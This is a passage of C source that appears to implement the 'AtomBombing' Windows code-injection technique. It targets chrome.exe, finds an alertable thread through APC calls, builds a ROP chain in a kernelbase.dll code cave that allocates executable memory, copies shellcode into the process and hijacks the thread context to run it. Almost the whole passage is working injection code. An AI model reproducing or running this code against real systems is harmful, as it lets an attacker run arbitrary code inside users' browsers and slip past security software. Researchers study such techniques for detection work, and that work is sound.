	printf("[*] Opened process's handle: %d (0x%X).\n\n\n", hProcess, hProcess);
	*phProcess = hProcess;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:

	return eReturn;
}

ESTATUS main_GetSectionHeader(
	HMODULE hModule, 
	PSTR pszSectionName, 
	PIMAGE_SECTION_HEADER *pptSectionHeader
	)
{
	PIMAGE_DOS_HEADER ptDosHeader = NULL;
	PIMAGE_NT_HEADERS ptNtHeaders = NULL;
	PIMAGE_SECTION_HEADER ptSectionHeader = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;
	BOOL bFound = FALSE;

	ptDosHeader = (PIMAGE_DOS_HEADER)hModule;
	if (IMAGE_DOS_SIGNATURE != ptDosHeader->e_magic)
	{
		goto lblCleanup;
	}

	ptNtHeaders = (PIMAGE_NT_HEADERS)(((DWORD)ptDosHeader) + (PUCHAR)ptDosHeader->e_lfanew);
	if (FALSE != IsBadReadPtr(ptNtHeaders, sizeof(IMAGE_NT_HEADERS)))
	{
		goto lblCleanup;
	}
	if (IMAGE_NT_SIGNATURE != ptNtHeaders->Signature)
	{
		goto lblCleanup;
	}

	ptSectionHeader = IMAGE_FIRST_SECTION(ptNtHeaders);

	for (int i = 0; i < ptNtHeaders->FileHeader.NumberOfSections; i++)
	{
		if (0 == strncmp(pszSectionName, (PCHAR)ptSectionHeader->Name, IMAGE_SIZEOF_SHORT_NAME))
		{
			bFound = TRUE;
			break;
		}
		ptSectionHeader++;
	}

	if (FALSE == bFound)
	{
		eReturn = ESTATUS_MAIN_GETSECTIONHEADER_SECTION_NOT_FOUND;
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;
	*pptSectionHeader = ptSectionHeader;

lblCleanup:
	return eReturn;
}

ESTATUS main_GetCodeCaveAddress(PVOID *ppvCodeCave)
{
	PIMAGE_SECTION_HEADER ptSectionHeader = NULL;
	PVOID pvCodeCave = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;
	HMODULE hNtDll = NULL;

	hNtDll = GetModuleHandleA("kernelbase.dll");
	if (NULL == hNtDll)
	{
		eReturn = ESTATUS_MAIN_GETCODECAVEADDRESS_GETMODULEHANDLEA_FAILED;
	}

	eReturn = main_GetSectionHeader(hNtDll, DATA_SECTION, &ptSectionHeader);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	pvCodeCave = (PVOID) (
		(DWORD) hNtDll + 
		ptSectionHeader->VirtualAddress + 
		ptSectionHeader->SizeOfRawData
		);

	eReturn = ESTATUS_SUCCESS;
	*ppvCodeCave = pvCodeCave;

lblCleanup:

	return eReturn;
}

ESTATUS main_FindRetGadget(PVOID *ppvRetGadget)
{
	PIMAGE_SECTION_HEADER ptSectionHeader = NULL;
	PVOID pvCodeCave = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;
	HMODULE hNtDll = NULL;
	PVOID pvRetGadget = NULL;

	hNtDll = GetModuleHandleA(NTDLL);
	if (NULL == hNtDll)
	{
		eReturn = ESTATUS_MAIN_FINDRETGADGET_GETMODULEHANDLEA_FAILED;
	}

	eReturn = main_GetSectionHeader(hNtDll, TEXT_SECTION, &ptSectionHeader);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	pvRetGadget = memchr(
		hNtDll + ptSectionHeader->VirtualAddress, 
		X86_RET, 
		ptSectionHeader->SizeOfRawData
		);
	if (NULL == pvRetGadget)
	{
		eReturn = ESTATUS_MAIN_FINDRETGADGET_RET_GADGET_NOT_FOUND;
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;
	*ppvRetGadget = pvRetGadget;

lblCleanup:

	return eReturn;
}
typedef struct _ROPCHAIN
{
	// Return address of ntdll!ZwAllocateMemory
	PVOID pvMemcpy;

	// Params for ntdll!ZwAllocateMemory
	HANDLE ZwAllocateMemoryhProcess;
	PVOID ZwAllocateMemoryBaseAddress;
	ULONG_PTR ZwAllocateMemoryZeroBits;
	PSIZE_T ZwAllocateMemoryRegionSize;
	ULONG ZwAllocateMemoryAllocationType;
	ULONG ZwAllocateMemoryProtect;

	// Return address of ntdll!memcpy
	PVOID pvRetGadget;

	// Params for ntdll!memcpy	
	PVOID MemcpyDestination;
	PVOID MemcpySource;
	SIZE_T MemcpyLength;

} ROPCHAIN, *PROPCHAIN;

ESTATUS main_BuildROPChain(
	PVOID pvROPLocation, 
	PVOID pvShellcodeLocation, 
	PROPCHAIN ptRopChain
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	ROPCHAIN tRopChain = { 0 };

	tRopChain.ZwAllocateMemoryhProcess = GetCurrentProcess();

	tRopChain.ZwAllocateMemoryBaseAddress = (PUCHAR)pvROPLocation + FIELD_OFFSET(
																			ROPCHAIN, 
																			MemcpyDestination
																			);
	tRopChain.ZwAllocateMemoryZeroBits = NULL;

	tRopChain.ZwAllocateMemoryRegionSize = (PSIZE_T)((PUCHAR)pvROPLocation + FIELD_OFFSET(
																					ROPCHAIN, 
																					MemcpyLength)
																					);
	tRopChain.ZwAllocateMemoryAllocationType = MEM_COMMIT;
	tRopChain.ZwAllocateMemoryProtect = PAGE_EXECUTE_READWRITE;
	tRopChain.MemcpyDestination = (PVOID)0x00;
	tRopChain.MemcpySource = pvShellcodeLocation;
	tRopChain.MemcpyLength = sizeof(SHELLCODE);
	
	eReturn = GetFunctionAddressFromDll(
		NTDLL, 
		MEMCPY, 
		&tRopChain.pvMemcpy
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	printf("ntdll!memcpy: 0x%X", tRopChain.pvMemcpy);

	// Find a ret instruction in order to finally jump to the 
	// newly allocated executable shellcode.
	eReturn = main_FindRetGadget(&tRopChain.pvRetGadget);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;
	*ptRopChain = tRopChain;

lblCleanup:

	return eReturn;

}

ESTATUS main_EnumProcessThreadIds(
	HANDLE hProcess, 
	PDWORD *ppdwThreadIds, 
	PDWORD pcbThreadIdsSize, 
	PDWORD pdwNumberOfProcessThreads
	)
{
	HANDLE hSnapshot = NULL;
	ESTATUS eReturn = ESTATUS_INVALID;
	THREADENTRY32 tThreadEntry;
	BOOL bErr = FALSE;
	DWORD dwProcessId = 0;
	PDWORD pdwThreadIds = NULL;
	DWORD cbThreadIdsSize = 0;
	DWORD dwNumberOfMatchingThreads = 0;

	dwProcessId = GetProcessId(hProcess);

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
	{
		goto lblCleanup;
	}

	tThreadEntry.dwSize = sizeof(THREADENTRY32);
	bErr = Thread32First(hSnapshot, &tThreadEntry);
	if (FALSE == bErr)
	{
		goto lblCleanup;
	}

	do
	{
		if (tThreadEntry.th32OwnerProcessID != dwProcessId)
		{
			continue;
		}

		cbThreadIdsSize += sizeof(tThreadEntry.th32ThreadID);
		if (sizeof(tThreadEntry.th32ThreadID) == cbThreadIdsSize)
		{

			pdwThreadIds = (PDWORD) HeapAlloc(
				GetProcessHeap(), 
				HEAP_ZERO_MEMORY, 
				cbThreadIdsSize
				);
		}
		else
		{
			pdwThreadIds = (PDWORD) HeapReAlloc(
				GetProcessHeap(), 
				HEAP_ZERO_MEMORY, 
				pdwThreadIds, 
				cbThreadIdsSize
				);
		}
		if (NULL == pdwThreadIds)
		{
			goto lblCleanup;
		}

		pdwThreadIds[dwNumberOfMatchingThreads++] = tThreadEntry.th32ThreadID;

	} while (bErr = Thread32Next(hSnapshot, &tThreadEntry));

	*ppdwThreadIds = pdwThreadIds;
	*pcbThreadIdsSize = cbThreadIdsSize;
	*pdwNumberOfProcessThreads = dwNumberOfMatchingThreads;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	if ((NULL != hSnapshot) && (INVALID_HANDLE_VALUE != hSnapshot))
	{
		CloseHandle(hSnapshot);
		hSnapshot = NULL;
	}
	
	if (ESTATUS_FAILED(eReturn))
	{
		if (NULL != pdwThreadIds)
		{
			HeapFree(GetProcessHeap(), 0, pdwThreadIds);
			pdwThreadIds = NULL;
		}
	}

	return eReturn;
}

VOID main_CloseLocalHandleArray(PHANDLE phHandles, DWORD cbHandleCount)
{
	for (DWORD dwIndex = 0; dwIndex < cbHandleCount; dwIndex++)
	{
		if (NULL != phHandles[dwIndex])
		{
			CloseHandle(phHandles[dwIndex]);
			phHandles[dwIndex] = NULL;
		}
	}
}

VOID main_CloseRemoteHandleArray(
	HANDLE hProcess,
	PHANDLE phHandles,
	DWORD cbHandleCount
	)
{
	for (DWORD dwIndex = 0; dwIndex < cbHandleCount; dwIndex++)
	{
		HANDLE hTemp = NULL;

		if (NULL != phHandles[dwIndex])
		{
			DuplicateHandle(
				hProcess,
				phHandles[dwIndex],
				GetCurrentProcess(),
				&hTemp,
				0,
				FALSE,
				DUPLICATE_CLOSE_SOURCE
				);
			phHandles[dwIndex] = NULL;
		}

		if (NULL != hTemp)
		{
			CloseHandle(hTemp);
			hTemp = NULL;
		}
	}
}

ESTATUS main_EnumProcessThreads(
	HANDLE hProcess, 
	PHANDLE *pphProcessThreadsHandles, 
	PDWORD pcbProcessThreadsHandlesSize, 
	PDWORD pdwNumberOfProcessThreads
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	PDWORD pdwProcessThreadIds = NULL;
	DWORD cbProcessThreadIdsSize = 0;
	DWORD dwNumberOfProcessThreads = 0;
	PHANDLE phProcessThreadsHandles = NULL;

	eReturn = main_EnumProcessThreadIds(
		hProcess, 
		&pdwProcessThreadIds, 
		&cbProcessThreadIdsSize, 
		&dwNumberOfProcessThreads
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	cbProcessThreadIdsSize = dwNumberOfProcessThreads * sizeof(HANDLE);
	phProcessThreadsHandles = (PHANDLE) HeapAlloc(
		GetProcessHeap(), 
		HEAP_ZERO_MEMORY, 
		cbProcessThreadIdsSize
		);
	if (NULL == phProcessThreadsHandles)
	{
		goto lblCleanup;
	}

	for (DWORD dwIndex = 0; dwIndex < dwNumberOfProcessThreads; dwIndex++)
	{
		DWORD dwThreadId = pdwProcessThreadIds[dwIndex];

		phProcessThreadsHandles[dwIndex] = OpenThread(THREAD_ALL_ACCESS, FALSE, dwThreadId);
		if (NULL == phProcessThreadsHandles[dwIndex])
		{
			eReturn = ESTATUS_MAIN_ENUMPROCESSTHREADS_OPENTHREAD_FAILED;
			goto lblCleanup;
		}
	}

	*pphProcessThreadsHandles = phProcessThreadsHandles;
	*pcbProcessThreadsHandlesSize = cbProcessThreadIdsSize;
	*pdwNumberOfProcessThreads = dwNumberOfProcessThreads;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	if (NULL != pdwProcessThreadIds)
	{
		HeapFree(GetProcessHeap(), 0, pdwProcessThreadIds);
		pdwProcessThreadIds = NULL;
	}
	if (ESTATUS_FAILED(eReturn))
	{
		main_CloseLocalHandleArray(phProcessThreadsHandles, dwNumberOfProcessThreads);

		if (NULL != phProcessThreadsHandles)
		{
			HeapFree(GetProcessHeap(), 0, phProcessThreadsHandles);
			phProcessThreadsHandles = NULL;
		}
	}
	return eReturn;
}

ESTATUS main_GetThreadContext(
	HANDLE hThread, 
	DWORD dwContextFlags, 
	PCONTEXT ptContext
	)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	DWORD dwErr = 0;
	BOOL bErr = FALSE;
	CONTEXT tContext = { NULL };

	tContext.ContextFlags = dwContextFlags;

	SuspendThread(hThread);
	if (((DWORD)-1) == dwErr)
	{
		eReturn = ESTATUS_MAIN_GETTHREADCONTEXT_SUSPENDTHREAD_FAILED;
		goto lblCleanup;
	}

	bErr = GetThreadContext(hThread, &tContext);
	if (FALSE == bErr)
	{
		eReturn = ESTATUS_MAIN_GETTHREADCONTEXT_GETTHREADCONTEXT_FAILED;
		goto lblCleanup;
	}

	ResumeThread(hThread);
	if (((DWORD)-1) == dwErr)
	{
		eReturn = ESTATUS_MAIN_GETTHREADCONTEXT_RESUMETHREAD_FAILED;
		goto lblCleanup;
	}

	eReturn = ESTATUS_SUCCESS;
	*ptContext = tContext;

lblCleanup:
	return eReturn;
}

ESTATUS main_FindAlertableThread(HANDLE hProcess, PHANDLE phAlertableThread)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	PHANDLE phProcessThreadsHandles = NULL;
	DWORD cbProcessThreadsHandlesSize = 0;
	DWORD dwNumberOfProcessThreads = 0;
	BOOL bErr = FALSE;
	DWORD dwErr = 0;
	HANDLE hAlertableThread = 0;
	PVOID pfnNtWaitForSingleObject = NULL;
	PHANDLE phLocalEvents = NULL;
	PHANDLE phRemoteEvents = NULL;

	eReturn = main_EnumProcessThreads(
		hProcess, 
		&phProcessThreadsHandles, 
		&cbProcessThreadsHandlesSize, 
		&dwNumberOfProcessThreads
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	for (DWORD dwIndex = 0; dwIndex < dwNumberOfProcessThreads; dwIndex++)
	{
		HANDLE hThread = phProcessThreadsHandles[dwIndex];
		
		eReturn = main_NtQueueApcThreadWaitForSingleObjectEx(
			hThread, 
			GetCurrentThread(), 
			5000, 
			TRUE);
		if (ESTATUS_FAILED(eReturn))
		{
			continue;
		}
	}

	phLocalEvents = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNumberOfProcessThreads * sizeof(HANDLE));
	if (NULL == phLocalEvents)
	{
		eReturn = ESTATUS_MAIN_FINDALERTABLETHREAD_HEAPALLOC_FAILED;
		goto lblCleanup;
	}

	phRemoteEvents = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwNumberOfProcessThreads * sizeof(HANDLE));
	if (NULL == phRemoteEvents)
	{
		eReturn = ESTATUS_MAIN_FINDALERTABLETHREAD_HEAPALLOC2_FAILED;
		goto lblCleanup;
	}

	for (DWORD dwIndex = 0; dwIndex < dwNumberOfProcessThreads; dwIndex++)
	{
		HANDLE hThread = phProcessThreadsHandles[dwIndex];
		
		phLocalEvents[dwIndex] = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (NULL == phLocalEvents[dwIndex])
		{
			eReturn = ESTATUS_MAIN_FINDALERTABLETHREAD_CREATEEVENT_FAILED;
			goto lblCleanup;
		}
		
		bErr = DuplicateHandle(
			GetCurrentProcess(),
			phLocalEvents[dwIndex],
			hProcess,
			&phRemoteEvents[dwIndex],
			0,
			FALSE,
			DUPLICATE_SAME_ACCESS
			);
		if (FALSE == bErr)
		{
			eReturn = ESTATUS_MAIN_FINDALERTABLETHREAD_DUPLICATEHANDLE_FAILED;
			goto lblCleanup;
		}
		
		eReturn = main_ApcSetEventAndKeepAlertable(hThread, phRemoteEvents[dwIndex]);
		if (ESTATUS_FAILED(eReturn))
		{
			goto lblCleanup;
		}

	}

	DWORD dwWaitResult = WaitForMultipleObjects(dwNumberOfProcessThreads, phLocalEvents, FALSE, 5000);
	if (WAIT_FAILED == dwWaitResult)
	{
		eReturn = ESTATUS_MAIN_FINDALERTABLETHREAD_WAITFORMULTIPLEOBJECTS_FAILED;
		goto lblCleanup;
	}
	if (WAIT_TIMEOUT == dwWaitResult)
	{
		eReturn = ESTATUS_MAIN_FINDALERTABLETHREAD_NO_ALERTABLE_THREADS_FOUND;
		goto lblCleanup;
	}
	
	hAlertableThread = phProcessThreadsHandles[dwWaitResult - WAIT_OBJECT_0];

	//If the thread is in an alertable state, keep it that way "forever".
	eReturn = main_NtQueueApcThreadWaitForSingleObjectEx(
		hAlertableThread, 
		GetCurrentThread(), 
		INFINITE, 
		TRUE
		);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	*phAlertableThread = hAlertableThread;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:

	main_CloseRemoteHandleArray(
		hProcess,
		phRemoteEvents,
		dwNumberOfProcessThreads
		);

	if (NULL != phRemoteEvents)
	{
		HeapFree(GetProcessHeap(), 0, phRemoteEvents);
		phRemoteEvents = NULL;
	}

	main_CloseLocalHandleArray(
		phLocalEvents,
		dwNumberOfProcessThreads
		);
	
	if (NULL != phLocalEvents)
	{
		HeapFree(GetProcessHeap(), 0, phLocalEvents);
		phLocalEvents = NULL;
	}

	for (DWORD dwIndex = 0; dwIndex < dwNumberOfProcessThreads; dwIndex++)
	{
		PHANDLE phThread = &phProcessThreadsHandles[dwIndex];

		if ((NULL != *phThread) && (hAlertableThread != *phThread))
		{
			CloseHandle(*phThread);
			*phThread = NULL;
		}
	}

	if (NULL != phProcessThreadsHandles)
	{
		HeapFree(GetProcessHeap(), 0, phProcessThreadsHandles);
		phProcessThreadsHandles = NULL;
	}
	
	return eReturn;
}

ESTATUS main_GetThreadTebAddress(HANDLE hThread, PVOID *ppvTebAddress)
{
	ESTATUS eReturn = ESTATUS_INVALID;
	CONTEXT tContext = { 0 };
	BOOL bErr = FALSE;
	LDT_ENTRY tLdtEnry = { 0 };
	PVOID pvTebAddress;

	eReturn = main_GetThreadContext(hThread, CONTEXT_SEGMENTS, &tContext);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	bErr = GetThreadSelectorEntry(hThread, tContext.SegFs, &tLdtEnry);
	if (FALSE == bErr)
	{
		eReturn = ESTATUS_MAIN_GETTHREADTEBADDRESS_GETTHREADSELECTORENTRY_FAILED;
		goto lblCleanup;
	}

	pvTebAddress = (PVOID)(
		(tLdtEnry.BaseLow) | 
		(tLdtEnry.HighWord.Bytes.BaseMid << 0x10) | 
		(tLdtEnry.HighWord.Bytes.BaseHi << 0x18)
		);

	*ppvTebAddress = pvTebAddress;
	eReturn = ESTATUS_SUCCESS;

lblCleanup:
	return eReturn;

}



int main()
{
	ESTATUS eReturn = ESTATUS_INVALID;
	PVOID pvRemoteShellcodeAddress = NULL;
	PVOID pvRemoteGetProcAddressLoadLibraryAddress = NULL;
	PVOID pvRemoteContextAddress = NULL;
	PVOID pvRemoteROPChainAddress = NULL;
	CONTEXT tContext = { 0 };
	CHAR acShellcode[] = SHELLCODE;
	PVOID pvCodeCave = NULL;
	BOOL bErr = FALSE;
	ROPCHAIN tRopChain = { 0 };
	HANDLE hProcess = NULL;
	HANDLE hAlertableThread = NULL;
	ATOM tAtom = 0;
	printf("[*] ATOM BOMBING\n\n\n");

	eReturn = main_OpenProcessByName(L"chrome.exe", &hProcess);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	printf("[*] Searching for an alertable thread.\n\n\n");
	eReturn = main_FindAlertableThread(hProcess, &hAlertableThread);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}
	printf("[*] Found an alertable thread. Handle: 0x%X.\n\n\n", hAlertableThread);

	printf("[*] Finding remote code cave.\n\n\n");
	eReturn = main_GetCodeCaveAddress(&pvCodeCave);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}
	printf("[*] Remote code cave found: 0x%X.\n\n\n", pvCodeCave);

	pvRemoteROPChainAddress = pvCodeCave;
	pvRemoteContextAddress = (PUCHAR)pvRemoteROPChainAddress + sizeof(ROPCHAIN);
	pvRemoteGetProcAddressLoadLibraryAddress = (PUCHAR)pvRemoteContextAddress + FIELD_OFFSET(CONTEXT, ExtendedRegisters);
	pvRemoteShellcodeAddress = (PUCHAR)pvRemoteGetProcAddressLoadLibraryAddress + 8;

	printf("[*] Building ROP chain.\n\n\n");
	eReturn = main_BuildROPChain(pvRemoteROPChainAddress, pvRemoteShellcodeAddress, &tRopChain);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	printf("[*] Copying the addresses of LoadLibraryA and GetProcAddress to the remote process's memory address space.\n\n\n");
	eReturn = main_ApcCopyFunctionPointers(hProcess, hAlertableThread, pvRemoteGetProcAddressLoadLibraryAddress);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	*(PDWORD)(acShellcode + SHELLCODE_FUNCTION_POINTERS_OFFSET) = (DWORD)(pvRemoteGetProcAddressLoadLibraryAddress);

	printf("[*] Copying the shellcode to the target process's address space.\n\n\n");
	eReturn = main_ApcWriteProcessMemory(hProcess, hAlertableThread, (PUCHAR)pvRemoteShellcodeAddress, acShellcode, sizeof(acShellcode));
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}


	printf("[*] Copying ROP chain to the target process's address space: 0x%X.\n\n\n", pvRemoteROPChainAddress);
	eReturn = main_ApcWriteProcessMemory(hProcess, hAlertableThread, (PUCHAR)pvRemoteROPChainAddress, &tRopChain, sizeof(tRopChain));
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	bErr = main_GetThreadContext(hAlertableThread, CONTEXT_CONTROL, &tContext);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

	tContext.Eip = (DWORD) GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwAllocateVirtualMemory");
	tContext.Ebp = (DWORD)(PUCHAR)pvRemoteROPChainAddress;
	tContext.Esp = (DWORD)(PUCHAR)pvRemoteROPChainAddress;

	printf("[*] Hijacking the remote thread to execute the shellcode (by executing the ROP chain).\n\n\n");
	eReturn = main_ApcSetThreadContext(hProcess, hAlertableThread, &tContext, pvRemoteContextAddress);
	if (ESTATUS_FAILED(eReturn))
	{
		goto lblCleanup;
	}

lblCleanup:
	if (NULL != hProcess)
	{
		CloseHandle(hProcess);
		hProcess = NULL;
	}
	if (NULL != hAlertableThread)
	{
		CloseHandle(hAlertableThread);
		hAlertableThread = NULL;
	}
	return 0;
}